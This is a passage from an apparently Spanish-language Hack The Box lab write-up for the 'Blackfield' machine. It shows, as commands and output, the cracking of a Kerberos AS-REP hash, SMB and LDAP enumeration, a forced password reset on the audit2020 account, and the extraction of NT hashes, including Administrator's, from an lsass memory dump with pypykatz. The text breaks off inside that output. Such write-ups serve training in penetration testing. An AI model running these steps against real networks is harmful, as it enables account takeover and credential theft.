<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="c">#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)</span>
1g 0:00:01:05 DONE <span class="o">(</span>2024-04-19 19:29<span class="o">)</span> 0.01524g/s 218487p/s 218487c/s 218487C/s <span class="c">#1WIF3Y..#*burberry#*1990</span>
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Vamos a validar que la contraseña sea correcta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span>
SMB         10.129.126.69   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.126.69   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>upport:#00^BlackKnight
</code></pre></div></div>

<ul>
  <li>El usuario no forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span>
SMB         10.129.126.69   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span>
HTTP        10.129.126.69   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.126.69:5985/wsman
WINRM       10.129.126.69   5985   DC01             <span class="o">[</span>-] BLACKFIELD.local<span class="se">\s</span>upport:#00^BlackKnight
</code></pre></div></div>

<h2 id="support-enumeration">Support Enumeration</h2>

<ul>
  <li>Vamos a listar los recursos compartidos nivel de red para ese usuario ya que tenemos credenciales validas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.126.69:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a ver si en <code class="language-plaintext highlighter-rouge">profiles$</code> hay algo interesante.</p>
  </li>
  <li>
    <p>Pero nada solo había carpetas para cada usuario y dentro no había nada.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> <span class="nt">-r</span> <span class="s1">'profiles$/support/'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.126.69:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	./profiles<span class="nv">$support</span>/
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	<span class="nb">.</span>
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	..
	SYSVOL                                            	READ ONLY	Logon server share
➜  content
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">ldapdomaindump</code> para enumerar por ese protocolo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  html ldapdomaindump <span class="nt">-u</span> <span class="s1">'blackfield.local\support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> 10.129.126.69
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting to host...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Binding to host
<span class="o">[</span>+] Bind OK
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting domain dump
<span class="o">[</span>+] Domain dump finished
</code></pre></div></div>

<ul>
  <li>Aquí tenemos los archivos que nos genera.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  html ll
total 1.4M
<span class="nt">-rw-r--r--</span> 1 root root 2.7K Apr 19 19:41 domain_computers.grep
<span class="nt">-rw-r--r--</span> 1 root root 6.1K Apr 19 19:41 domain_computers.html
<span class="nt">-rw-r--r--</span> 1 root root  39K Apr 19 19:41 domain_computers.json
<span class="nt">-rw-r--r--</span> 1 root root 6.4K Apr 19 19:41 domain_computers_by_os.html
<span class="nt">-rw-r--r--</span> 1 root root  10K Apr 19 19:41 domain_groups.grep
<span class="nt">-rw-r--r--</span> 1 root root  17K Apr 19 19:41 domain_groups.html
<span class="nt">-rw-r--r--</span> 1 root root  78K Apr 19 19:41 domain_groups.json
<span class="nt">-rw-r--r--</span> 1 root root  262 Apr 19 19:41 domain_policy.grep
<span class="nt">-rw-r--r--</span> 1 root root 1.2K Apr 19 19:41 domain_policy.html
<span class="nt">-rw-r--r--</span> 1 root root 6.0K Apr 19 19:41 domain_policy.json
<span class="nt">-rw-r--r--</span> 1 root root   71 Apr 19 19:41 domain_trusts.grep
<span class="nt">-rw-r--r--</span> 1 root root  828 Apr 19 19:41 domain_trusts.html
<span class="nt">-rw-r--r--</span> 1 root root    2 Apr 19 19:41 domain_trusts.json
<span class="nt">-rw-r--r--</span> 1 root root  62K Apr 19 19:41 domain_users.grep
<span class="nt">-rw-r--r--</span> 1 root root 143K Apr 19 19:41 domain_users.html
<span class="nt">-rw-r--r--</span> 1 root root 890K Apr 19 19:41 domain_users.json
<span class="nt">-rw-r--r--</span> 1 root root 106K Apr 19 19:41 domain_users_by_group.html
<span class="nt">-rw-r--r--</span> 1 root root  11K Feb  5 19:54 index.html
<span class="nt">-rw-r--r--</span> 1 root root  615 Feb  5 19:57 index.nginx-debian.html
</code></pre></div></div>

<ul>
  <li>Para poder verlos vamos habilitar el servidor de Apache2.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  html service apache2 start
</code></pre></div></div>

<ul>
  <li>Ahora podemos ver cualquier archivo que queramos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/1.png" />
</p>

<ul>
  <li>El usuario <code class="language-plaintext highlighter-rouge">svc_backup</code> pertenece al grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/2.png" />
</p>

<h2 id="audit2020">audit2020</h2>

<ul>
  <li>Bueno necesitamos su contraseña pero por el momento no conocemos vías para convertirnos en ese usuario así que vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound bloodhound-python <span class="nt">-c</span> all <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> <span class="nt">-ns</span> 10.129.23.192 <span class="nt">-d</span> blackfield.local
INFO: Found AD domain: blackfield.local
INFO: Getting TGT <span class="k">for </span>user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="o">[</span>Errno Connection error <span class="o">(</span>dc01.blackfield.local:88<span class="o">)]</span> <span class="o">[</span>Errno <span class="nt">-2</span><span class="o">]</span> Name or service not known
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 316 <span class="nb">users
</span>INFO: Found 52 <span class="nb">groups
</span>INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done <span class="k">in </span>00M 24S
</code></pre></div></div>

<ul>
  <li>Podemos forzar a cambiarle la contraseña al usuario <code class="language-plaintext highlighter-rouge">AUDIT2020</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/3.png" />
</p>

<ul>
  <li>Podemos usar <code class="language-plaintext highlighter-rouge">net</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/4.png" />
</p>

<ul>
  <li>Y con esto ya se supone que le cambiamos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound net rpc password audit2020 <span class="nt">-U</span> <span class="s1">'support'</span> <span class="nt">-S</span> 10.129.23.192
Enter new password <span class="k">for </span>audit2020:
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>upport]:
</code></pre></div></div>

<ul>
  <li>Vamos a validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound crackmapexec smb 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\a</span>udit2020:miguel123<span class="nv">$!</span>z
</code></pre></div></div>

<ul>
  <li>Vamos a validar los recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	READ ONLY	Forensic / Audit share.
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Tenemos acceso a un directorio interesante <code class="language-plaintext highlighter-rouge">Forensic / Audit share</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">-r</span> forensic <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	READ ONLY	Forensic / Audit share.
	./forensic
	dr--r--r--                0 Sun Feb 23 09:10:16 2020	<span class="nb">.</span>
	dr--r--r--                0 Sun Feb 23 09:10:16 2020	..
	dr--r--r--                0 Sun Feb 23 12:14:37 2020	commands_output
	dr--r--r--                0 Thu May 28 15:29:24 2020	memory_analysis
	dr--r--r--                0 Fri Feb 28 16:30:34 2020	tools
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Y bueno dentro de una carpeta encontramos un <code class="language-plaintext highlighter-rouge">.zip</code> que ya es interesante <code class="language-plaintext highlighter-rouge">lsass.zip</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">-r</span> forensic/memory_analysis <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	READ ONLY	Forensic / Audit share.
	./forensicmemory_analysis
	dr--r--r--                0 Thu May 28 15:29:24 2020	<span class="nb">.</span>
	dr--r--r--                0 Thu May 28 15:29:24 2020	..
	fr--r--r--         37876530 Thu May 28 15:29:24 2020	conhost.zip
	fr--r--r--         24962333 Thu May 28 15:29:24 2020	ctfmon.zip
	fr--r--r--         23993305 Thu May 28 15:29:24 2020	dfsrs.zip
	fr--r--r--         18366396 Thu May 28 15:29:24 2020	dllhost.zip
	fr--r--r--          8810157 Thu May 28 15:29:24 2020	ismserv.zip
	fr--r--r--         41936098 Thu May 28 15:29:24 2020	lsass.zip
	fr--r--r--         64288607 Thu May 28 15:29:24 2020	mmc.zip
	fr--r--r--         13332174 Thu May 28 15:29:24 2020	RuntimeBroker.zip
	fr--r--r--        131983313 Thu May 28 15:29:24 2020	ServerManager.zip
	fr--r--r--         33141744 Thu May 28 15:29:24 2020	sihost.zip
	fr--r--r--         33756344 Thu May 28 15:29:24 2020	smartscreen.zip
	fr--r--r--         14408833 Thu May 28 15:29:24 2020	svchost.zip
	fr--r--r--         34631412 Thu May 28 15:29:24 2020	taskhostw.zip
	fr--r--r--         14255089 Thu May 28 15:29:24 2020	winlogon.zip
	fr--r--r--          4067425 Thu May 28 15:29:24 2020	wlms.zip
	fr--r--r--         18303252 Thu May 28 15:29:24 2020	WmiPrvSE.zip
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<h2 id="shell-as-svc_backup">Shell as svc_backup</h2>

<ul>
  <li>
    <p><a href="https://www.reviversoft.com/es/processes/lsass.exe?ncr=1">https://www.reviversoft.com/es/processes/lsass.exe?ncr=1</a>.</p>
  </li>
  <li>
    <p>Vamos a descárgalo a nuestra maquina.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">--download</span> forensic/memory_analysis/lsass.zip <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[</span>+] Starting download: forensic<span class="se">\m</span>emory_analysis<span class="se">\l</span>sass.zip <span class="o">(</span>41936098 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Blackfield/content/bloodhound/10.129.23.192-forensic_memory_analysis_lsass.zip
</code></pre></div></div>

<ul>
  <li>Dentro tenemos el archivo importante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l lsass.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 41936098 bytes <span class="o">(</span>40 MiB<span class="o">)</span>

Listing archive: lsass.zip

<span class="nt">--</span>
Path <span class="o">=</span> lsass.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 41936098

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2020-02-23 11:02:02 ....A    143044222     41935982  lsass.DMP
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2020-02-23 11:02:02          143044222     41935982  1 files
</code></pre></div></div>

<ul>
  <li>Vamos a extraerlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora podemos usar la siguiente herramienta <a href="https://sniferl4bs.com/2020/03/extrayendo-credenciales-de-un-volcado-de-memoria-de-lssas.exe-con-pypykatz/">https://sniferl4bs.com/2020/03/extrayendo-credenciales-de-un-volcado-de-memoria-de-lssas.exe-con-pypykatz/</a>.</p>
  </li>
  <li>
    <p>Vamos a obtener información privilegiada.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: <span class="o">========</span> lsass.DMP <span class="o">=======</span>
<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 406458 <span class="o">(</span>633ba<span class="o">)</span>
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
	<span class="o">==</span> WDIGEST <span class="o">[</span>633ba]<span class="o">==</span>
		username svc_backup
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
	<span class="o">==</span> WDIGEST <span class="o">[</span>633ba]<span class="o">==</span>
		username svc_backup
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 365835 <span class="o">(</span>5950b<span class="o">)</span>
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>5950b]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5950b]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 365493 (593b5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.200147+00:00
sid S-1-5-96-0-2
luid 365493
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [593b5]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	<span class="o">==</span> WDIGEST <span class="o">[</span>593b5]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 257142 <span class="o">(</span>3ec76<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.318909+00:00
sid S-1-5-18
luid 257142
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 153705 <span class="o">(</span>25869<span class="o">)</span>
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: Administrator
		Domain: BLACKFIELD
		LM: NA
		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
		DPAPI: 240339f898b6ac4ce3f34702e4a89550
	<span class="o">==</span> WDIGEST <span class="o">[</span>25869]<span class="o">==</span>
		username Administrator
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: Administrator
		Domain: BLACKFIELD.LOCAL
	<span class="o">==</span> WDIGEST <span class="o">[</span>25869]<span class="o">==</span>
		username Administrator
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> DPAPI <span class="o">[</span>25869]<span class="o">==</span>
		luid 153705
		key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
		masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
		sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 137110 <span class="o">(</span>21796<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.068590+00:00
sid S-1-5-18
luid 137110
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 134695 <span class="o">(</span>20e27<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.678019+00:00
sid S-1-5-18
luid 134695
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 40310 <span class="o">(</span>9d76<span class="o">)</span>
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40310
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>9d76]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
